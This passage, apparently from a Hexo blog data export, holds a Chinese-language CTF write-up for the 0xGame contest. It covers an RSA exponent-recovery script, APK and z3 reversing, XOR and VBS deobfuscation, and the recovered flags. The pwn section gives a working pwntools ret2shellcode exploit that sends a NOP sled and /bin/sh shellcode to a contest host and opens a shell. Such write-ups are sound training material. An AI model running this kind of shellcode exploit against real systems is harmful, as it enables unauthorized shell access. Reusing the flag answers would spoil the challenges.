class=\"number\">3768551934826292593833035309611313515410350948177015252689101612760092214724819460968940593137063674343550213845565985577708096326384804161039234286824257</span></span><br><span class=\"line\">p = <span class=\"number\">92183828593120412163104340291760641288180588598799559753245539989169201953287</span></span><br><span class=\"line\">q = <span class=\"number\">112341696090923376544622587134650063030670067695398128869588369062187162349067</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 手动交互得到的加密数据 &#123;明文: 密文&#125;</span></span><br><span class=\"line\">encrypted_data = &#123;</span><br><span class=\"line\">    <span class=\"number\">2</span>: <span class=\"number\">8661456987622729713284875140324390021854656336220032548752643276741012650814412956153724560835436673697707915353315705759467237138561861755697546499239404</span>,</span><br><span class=\"line\">    <span class=\"number\">3</span>: <span class=\"number\">4517771087385690059400613106400236028797989648570504435335842458967594563252372288742748213792858933900161922306165687720613665857113406491341498148219072</span>,</span><br><span class=\"line\">    <span class=\"number\">4</span>: <span class=\"number\">4461368238758747164492118791058784945853565508910915006788491998225437417465209099602788188410713446842464672424069396400510956103768639651291936269944409</span>,</span><br><span class=\"line\">    <span class=\"number\">5</span>: <span class=\"number\">252593148397960384672099236062132976194716239214893311677001562315947306045440602988806836496469883640979695884101793958904581043170908588967763161253161</span>,</span><br><span class=\"line\">    <span class=\"comment\"># ... 您可以根据需要添加更多数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 工具函数 (无变动) =========</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_prime_factors</span>(<span class=\"params\">n, limit=<span class=\"number\">1000000</span></span>):</span><br><span class=\"line\">    factors = &#123;&#125;</span><br><span class=\"line\">    d = <span class=\"number\">2</span></span><br><span class=\"line\">    temp_n = n</span><br><span class=\"line\">    <span class=\"keyword\">while</span> d * d &lt;= temp_n:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d &gt; limit: <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> temp_n % d == <span class=\"number\">0</span>:</span><br><span class=\"line\">            factors[d] = factors.get(d, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">            temp_n //= d</span><br><span class=\"line\">        d += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp_n &gt; <span class=\"number\">1</span> <span class=\"keyword\">and</span> temp_n &lt;= limit:</span><br><span class=\"line\">        factors[temp_n] = factors.get(temp_n, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sorted</span>(factors.keys())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extended_gcd</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == <span class=\"number\">0</span>: <span class=\"keyword\">return</span> b, <span class=\"number\">0</span>, <span class=\"number\">1</span></span><br><span class=\"line\">    d, x1, y1 = extended_gcd(b % a, a)</span><br><span class=\"line\">    x = y1 - (b // a) * x1</span><br><span class=\"line\">    y = x1</span><br><span class=\"line\">    <span class=\"keyword\">return</span> d, x, y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">chinese_remainder_theorem</span>(<span class=\"params\">congruences</span>):</span><br><span class=\"line\">    M = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _, n_i <span class=\"keyword\">in</span> congruences: M *= n_i</span><br><span class=\"line\">    result = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> a_i, n_i <span class=\"keyword\">in</span> congruences:</span><br><span class=\"line\">        M_i = M // n_i</span><br><span class=\"line\">        _, N_i, _ = extended_gcd(M_i, n_i)</span><br><span class=\"line\">        result = (result + a_i * M_i * N_i) % M</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 离线解密主逻辑 =========</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve_offline</span>():</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    phi_n = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] n: <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] phi(n): <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(phi_n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    factors = get_prime_factors(phi_n, limit=<span class=\"number\">1000000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(factors)&#125;</span> small prime factors of phi(n) up to 1,000,000.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    congruences = []</span><br><span class=\"line\">    moduli_product = <span class=\"number\">1</span></span><br><span class=\"line\">    E_UPPER_BOUND = <span class=\"number\">2</span>**<span class=\"number\">300</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p_i <span class=\"keyword\">in</span> factors:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[*] Trying to find e mod <span class=\"subst\">&#123;p_i&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 寻找合适的基 m</span></span><br><span class=\"line\">        base_m = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(encrypted_data.keys()):</span><br><span class=\"line\">            <span class=\"comment\"># 检查这个基 m 是否能用</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">pow</span>(m, phi_n // p_i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                base_m = m</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> base_m == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Could not find a suitable base in provided data for p_i = <span class=\"subst\">&#123;p_i&#125;</span>. Skipping.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Using base m = <span class=\"subst\">&#123;base_m&#125;</span> from provided data.&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        m_prime = <span class=\"built_in\">pow</span>(base_m, phi_n // p_i, n)</span><br><span class=\"line\">        c_m = encrypted_data[base_m]</span><br><span class=\"line\">        c_prime = <span class=\"built_in\">pow</span>(c_m, phi_n // p_i, n)</span><br><span class=\"line\">        </span><br><span class=\"line\">        found_x = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(p_i):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">pow</span>(m_prime, x, n) == c_prime:</span><br><span class=\"line\">                found_x = x</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> found_x != -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Solved! e \\u2261 <span class=\"subst\">&#123;found_x&#125;</span> (mod <span class=\"subst\">&#123;p_i&#125;</span>)&quot;</span>)</span><br><span class=\"line\">            congruences.append((found_x, p_i))</span><br><span class=\"line\">            moduli_product *= p_i</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Failed to solve for e mod <span class=\"subst\">&#123;p_i&#125;</span>.&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> moduli_product &gt; E_UPPER_BOUND:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[+] Collected enough congruences to determine e.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"keyword\">if</span> moduli_product &lt;= E_UPPER_BOUND:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] Could not find enough small prime factors to determine e. The attack failed.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] Solving for e using Chinese Remainder Theorem...&quot;</span>)</span><br><span class=\"line\">    e = chinese_remainder_theorem(congruences)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found e: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> gmpy2.is_prime(e):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Verification successful: e is a prime number.&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Warning: Calculated e is not a prime number.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] Calculating private key d and decrypting the flag...&quot;</span>)</span><br><span class=\"line\">    d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi_n)</span><br><span class=\"line\">    flag_val = <span class=\"built_in\">pow</span>(c_flag, d, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag = long_to_bytes(flag_val)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] DECRYPTED FLAG: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> err:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[-] Failed to decode the flag: <span class=\"subst\">&#123;err&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Decrypted integer value: <span class=\"subst\">&#123;flag_val&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve_offline()</span><br></pre></td></tr></table></figure>\n\n<p>类似Pohlig-Hellman攻击，在这个子群里解DLP，解出很多模数互质的解后就可以解原题了，通过很多个加密过的数来逆向还原加密过程，求解e，p，q，从而解出flag：<code>0xGame&#123;69d14068-30b4-41df-a17b-de434c3bc7b8&#125;</code></p>\n<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pwn</span><br><span class=\"line\">pwn.context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p = pwn.remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class=\"number\">36618</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;time&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = pwn.asm(pwn.shellcraft.sh())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload: 填充 + NOP滑梯 + Shellcode</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">80</span> + <span class=\"string\">b&#x27;\\x90&#x27;</span> *<span class=\"number\">80</span> + shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>pwn.shellcraft 会根据 context 自动生成对应的 shellcode</strong></p>\n<ul>\n<li><code>pwn.shellcraft.sh()</code>用pwn里的shellcraft板子sh()生成执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>得到shell的汇编</li>\n<li>然后使用<code>pwn.asm()</code>函数将汇编指令转换成二进制机器码（字节流），这样子发送过去才能被识别。</li>\n<li>最重要的是<code>NOP</code>空指令滑梯，由于程序在80-159之间跳转的偏移是不确定的，若将shellcode放在这个区域,会导致程序不能从第一条shellcode指令开始正确的执行，所以我们可以使用NOP指令（机器码0x90，填充为\\x90），<code>b&#39;\\x90&#39;*80</code>,b’ ‘表示以字节流发送，用<code>\\x90</code>(空指令)填充完这个不确定的区域，让程序就像在一个“滑梯”上向下滑行，直到滑出这个区域，执行我们紧跟在后面的真实 shellcode。</li>\n</ul>\n<p>得到flag：<code>0xGame&#123;Not_only_nop_can_jmp_controlstream&#125;</code></p>\n<h1 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h1><h2 id=\"apk逆向\"><a href=\"#apk逆向\" class=\"headerlink\" title=\"apk逆向\"></a>apk逆向</h2><p><code>_4nd_dex_loader&#125;</code>:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入z3库</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 定义变量</span></span><br><span class=\"line\"><span class=\"comment\"># 每个变量是16个十六进制字符，即 64 位</span></span><br><span class=\"line\">v0, v1, v2 = BitVecs(<span class=\"string\">&#x27;v0 v1 v2&#x27;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 创建求解器实例</span></span><br><span class=\"line\">s = Solver()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 添加数学方程约束</span></span><br><span class=\"line\">s.add(v1 + v0 * <span class=\"number\">3</span> == <span class=\"number\">27454419028250566601</span>)</span><br><span class=\"line\">s.add(v2 * <span class=\"number\">2</span> - v1 * <span class=\"number\">5</span> + <span class=\"number\">20616666104378640363</span> == <span class=\"number\">0</span>)</span><br><span class=\"line\">s.add(v0 + v2 * <span class=\"number\">4</span> == <span class=\"number\">0x1dce62be9f0fa2f6c</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 添加结构性约束</span></span><br><span class=\"line\"><span class=\"comment\"># v1 由 v0 的低32位 (Extract(31, 0, v0)) 和 v2 的高32位 (Extract(63, 32, v2)) 组成</span></span><br><span class=\"line\">s.add(v1 == Concat(Extract(<span class=\"number\">31</span>, <span class=\"number\">0</span>, v0), Extract(<span class=\"number\">63</span>, <span class=\"number\">32</span>, v2)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 检查解是否存在并输出</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> s.check() == sat:</span><br><span class=\"line\">    m = s.model()</span><br><span class=\"line\">    <span class=\"comment\"># 提取v0和v2的值</span></span><br><span class=\"line\">    val_v0 = m[v0].as_long()</span><br><span class=\"line\">    val_v2 = m[v2].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将v0和v2的值格式化为16位的十六进制字符串</span></span><br><span class=\"line\">    hex_v0 = <span class=\"built_in\">format</span>(val_v0, <span class=\"string\">&#x27;016x&#x27;</span>)</span><br><span class=\"line\">    hex_v2 = <span class=\"built_in\">format</span>(val_v2, <span class=\"string\">&#x27;016x&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 最终的输入字符串 str 是 v0 和 v2 的拼接</span></span><br><span class=\"line\">    flag_hex = hex_v0 + hex_v2</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;求解成功!&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;v0 = 0x<span class=\"subst\">&#123;hex_v0&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;v2 = 0x<span class=\"subst\">&#123;hex_v2&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;拼接后的Hex字符串: <span class=\"subst\">&#123;flag_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将十六进制字符串转换为ASCII字符</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag_ascii = <span class=\"built_in\">bytes</span>.fromhex(flag_hex).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;ASCII结果: <span class=\"subst\">&#123;flag_ascii&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;转换为ASCII失败: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;求解失败，方程无解。&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>资源文件–&gt;Assets–&gt;dex.zip,<strong>.zip文件一般是不会出现在这里的</strong>，所以flag的关键应该就放在这里面，导出这个dex.zip文件，解压缩，010打开查看文件头，是<strong>64 65 78 0A</strong>，所以这个其实并不是zip，而是一个dex文件，更改文件名为dex.dex，用jadx打开，就能看到反编译的源码了，用z3解方程组，得到后半段<code>_4nd_dex_loader&#125;</code></p>\n<p><code>0xGame&#123;Do_y0u_l0v3_andr01d</code>:</p>\n<p>前半段在源代码–&gt;com–&gt;example.easyapp–&gt;MainActivity–&gt;onCreate$lambda$方法中找到base64编码过的flag：<code>MHhHYW1le0RvX3kwdV9sMHYzX2FuZHIwMWQ=</code></p>\n<p>解码得到<code>0xGame&#123;Do_y0u_l0v3_andr01d</code></p>\n<p>拼接flag得到：<code>0xGame&#123;Do_y0u_l0v3_andr01d_4nd_dex_loader&#125;</code></p>\n<p><strong>一般都在源代码–&gt;com–&gt;MainActivity里面</strong></p>\n<h2 id=\"扫雷\"><a href=\"#扫雷\" class=\"headerlink\" title=\"扫雷\"></a>扫雷</h2><p>分析<code>.js</code>文件，可以看到触发给flag的逻辑，当难度为expert时玩家胜利会触发<code>_0x20eae2</code>这个函数，函数内部调用了<code>_0x172ca4</code>函数，这里包含了解密flag的逻辑–<strong>重复密钥异或</strong>(XOR)，密钥key–<code>WebIsInteresting</code>和flag密文<code>g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P&#125;^&#125;\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e</code>，</p>\n<p>逆向解密：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encrypted_data = <span class=\"string\">b&quot;g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P&#125;^&#125;\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e&quot;</span></span><br><span class=\"line\">key = <span class=\"string\">b&quot;WebIsInteresting&quot;</span></span><br><span class=\"line\">decrypted_data = <span class=\"built_in\">bytearray</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(encrypted_data)):</span><br><span class=\"line\">  decrypted_data.append(encrypted_data[i] ^ key[i % <span class=\"built_in\">len</span>(key)])</span><br><span class=\"line\"></span><br><span class=\"line\">flag = decrypted_data.decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;463950f9-9824-4bfb-8230-98ab02d431d0&#125;</code></p>\n<h2 id=\"VBS\"><a href=\"#VBS\" class=\"headerlink\" title=\"VBS\"></a>VBS</h2><p>把<code>Execute</code>改为<code>wscript.echo</code>，然后在终端输入<code>cscript.exe 1.vbs</code>就能得到源代码输出到终端，</p>\n<ul>\n<li><code>wscript.exe 1.vbs</code>   输出到一个程序窗口，不方便复制，</li>\n<li><code>cscript.exe 1.vbs</code>    输出到终端，更方便复制。</li>\n</ul>\n<p>可以观察到源码分两段，中间有<code>Execute Code</code>分隔，修改原.vbs，最后一行加上<code>Wscripts.Echo</code>，就能看到去了第二层混淆的源码，</p>\n<p>但是再观察一下，后面还是好几行的乱码，于是再进行<code>Execute</code>到<code>Wscript.Echo</code>的转换，三层混淆，我没招了😭😭</p>\n<p>三层混淆解完之后，就能看到base64编码表<code>fx6LUY5at9lnwmd3TbqzuRy+AipWHPDoXZKMFGCV2I/QjSreEsh18NJkg0v74OcB</code>和flag密文<code>waZaAyNGDJ9CwLfNdzYCnyUsAJtSmLU0wqNKmLYFnyT8iyRMi5UEAMH0da8=</code>，放到cyberchef里解一下密，得到flag：<code>0xGame&#123;bf00591f-a1cb-4191-b41d-d4eecda0b798&#125;</code></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cmeut9edi0001kot81vp174w8","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmeut9edt000ckot80dodaa4q"},{"post_id":"cmeut9edl0003kot8599lcehv","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmeut9edt000ekot81p4a0je3"},{"post_id":"cmew8u8s00000uot89nezhdim","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmew8u8s50003uot8c61f59i1"},{"post_id":"cmexna49i0000h4t81t4dfb9k","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmexna49m0002h4t8a8tt9hc9"},{"post_id":"cmez3h6o000002gt87y8v0ipi","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmez3h6o700022gt86j44hog6"},{"post_id":"cmf24evgc0000nkt88c7c38q4","category_id":"cmf24pwpi0000rst8aqjic802","_id":"cmf24pwpn0001rst87yr3bhbp"},{"post_id":"cmfxt9ab2000040t894xibgtg","category_id":"cmf24pwpi0000rst8aqjic802","_id":"cmfxt9ab6000240t84d9qd9bu"},{"post_id":"cmg29rsvk0000fst8arwe71kl","category_id":"cmf24pwpi0000rst8aqjic802","_id":"cmg29rsvp0002fst83lko3b2x"},{"post_id":"cmgkxc3li0000ggt84z7wbir0","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmgkxc3ll0001ggt812cwas64"},{"post_id":"cmgqounfm0000sgt86poc8cxh","category_id":"cmf24pwpi0000rst8aqjic802","_id":"cmgqounfq0002sgt80fki61sn"},{"post_id":"cmgx44tld0000jst8f92f4noz","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmgx44tlg0001jst88co35au5"},{"post_id":"cmhowggik000058t8a4zzef9o","category_id":"cmeut9edn0004kot8euwrbqyp","_id":"cmhowggio000158t84pvif1it"}],"PostTag":[{"post_id":"cmeut9edi0001kot81vp174w8","tag_id":"cmeut9edo0005kot80rtzaz1q","_id":"cmeut9edu000hkot8co963stf"},{"post_id":"cmeut9edi0001kot81vp174w8","tag_id":"cmeut9eds000bkot89bnhc1iz","_id":"cmeut9edu000ikot8aw933vup"},{"post_id":"cmeut9edi0001kot81vp174w8","tag_id":"cmeut9edt000dkot83k8e2ue1","_id":"cmeut9edu000kkot81ctt9gad"},{"post_id":"cmeut9edi0001kot81vp174w8","tag_id":"cmeut9edt000fkot83ttua35e","_id":"cmeut9edu000lkot85h9ba0s8"},{"post_id":"cmeut9edl0003kot8599lcehv","tag_id":"cmeut9edo0005kot80rtzaz1q","_id":"cmeut9edv000nkot8dioe9lux"},{"post_id":"cmeut9edl0003kot8599lcehv","tag_id":"cmeut9eds000bkot89bnhc1iz","_id":"cmeut9edv000okot80p4t2kdn"},{"post_id":"cmeut9edl0003kot8599lcehv","tag_id":"cmeut9edt000dkot83k8e2ue1","_id":"cmeut9edv000pkot8emnvdd93"},{"post_id":"cmew8u8s00000uot89nezhdim","tag_id":"cmeut9edo0005kot80rtzaz1q","_id":"cmew8u8s50001uot85tvcdgm7"},{"post_id":"cmew8u8s00000uot89nezhdim","tag_id":"cmeut9eds000bkot89bnhc1iz","_id":"cmew8u8s50002uot8hs1n7ps4"},{"post_id":"cmew8u8s00000uot89nezhdim","tag_id":"cmexna49j0001h4t86zxw6kfp","_id":"cmexna49m0004h4t814706c7h"},{"post_id":"cmexna49i0000h4t81t4dfb9k","tag_id":"cmexna49j0001h4t86zxw6kfp","_id":"cmexna49n0005h4t8839v6h95"},{"post_id":"cmexna49i0000h4t81t4dfb9k","tag_id":"cmeut9eds000bkot89bnhc1iz","_id":"cmexna49n0006h4t8f64083ir"},{"post_id":"cmexna49i0000h4t81t4dfb9k","tag_id":"cmeut9edo0005kot80rtzaz1q","_id":"cmexna49n0007h4t8fv9ga1ox"},{"post_id":"cmez3h6o000002gt87y8v0ipi","tag_id":"cmeut9eds000bkot89bnhc1iz","_id":"cmez3h6o900032gt8h3wybr7p"},{"post_id":"cmez3h6o000002gt87y8v0ipi","tag_id":"cmez3h6o500012gt85t94c4yw","_id":"cmez3h6o900042gt8eber75fi"},{"post_id":"cmez3h6o000002gt87y8v0ipi","tag_id":"cmeut9edo0005kot80rtzaz1q","_id":"cmez3h6o900052gt8b2ml6abu"},{"post_id":"cmf24evgc0000nkt88c7c38q4","tag_id":"cmf22vtj10002lwt888ls19ft","_id":"cmf24evgi0001nkt84top8gkh"},{"post_id":"cmfxt9ab2000040t894xibgtg","tag_id":"cmf4y59s20001vkt8cpyge40v","_id":"cmfxt9ab6000140t854aq4yfl"},{"post_id":"cmg29rsvk0000fst8arwe71kl","tag_id":"cmg29rsvo0001fst8ck615hee","_id":"cmg29rsvp0003fst87fkvcg2n"},{"post_id":"cmgqounfm0000sgt86poc8cxh","tag_id":"cmg29rsvo0001fst8ck615hee","_id":"cmgqounfq0001sgt82vda2pnd"}],"Tag":[{"name":"ubuntu","_id":"cmeut9edo0005kot80rtzaz1q"},{"name":"pwntools","_id":"cmeut9eds000bkot89bnhc1iz"},{"name":"pwndbg","_id":"cmeut9edt000dkot83k8e2ue1"},{"name":"python","_id":"cmeut9edt000fkot83ttua35e"},{"name":"汇编","_id":"cmexna49j0001h4t86zxw6kfp"},{"name":"format-string","_id":"cmez3h6o500012gt85t94c4yw"},{"name":"语法糖","_id":"cmf22vtj10002lw